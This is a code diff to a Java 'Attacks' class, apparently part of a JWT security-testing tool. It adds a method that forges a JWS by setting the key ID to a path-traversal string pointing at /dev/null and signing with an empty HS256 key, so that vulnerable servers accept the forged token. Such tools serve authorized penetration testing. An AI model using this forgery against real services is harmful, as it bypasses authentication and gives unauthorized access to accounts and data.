@@ -84,6 +84,23 @@ public class Attacks {
     }
 
     /**
+     * Choose NULL kid and sign JWS with null signature
+     *
+     * @param jws the JWS to use for the attack
+     * @return the modified JWS
+     */
+    public static JWS nullKid(JWS jws) throws PEMUtils.PemException, Key.UnsupportedKeyException, CryptoUtils.SigningException {
+        // Construct a NULL signing key
+        JWKKey nullSigningKey = new JWKKey(new OctetSequenceKey.Builder(new byte[0]).build());
+
+        
+        // Build a new header for the null kid and HMAC algorithm
+        com.nimbusds.jose.JWSAlgorithm alg = new com.nimbusds.jose.JWSAlgorithm("HS256");
+        JWSHeader nullSigningInfo = new JWSHeader.Builder(alg).type(JOSEObjectType.JWT).keyID("../../../../../dev/null").build();
+        return CryptoUtils.sign(nullSigningInfo.toBase64URL(), jws.getEncodedPayload(), nullSigningKey, nullSigningInfo);
+    }
+
+    /**
      * Perform the embedded JWK attack
      *
      * @param jws the JWS to attack
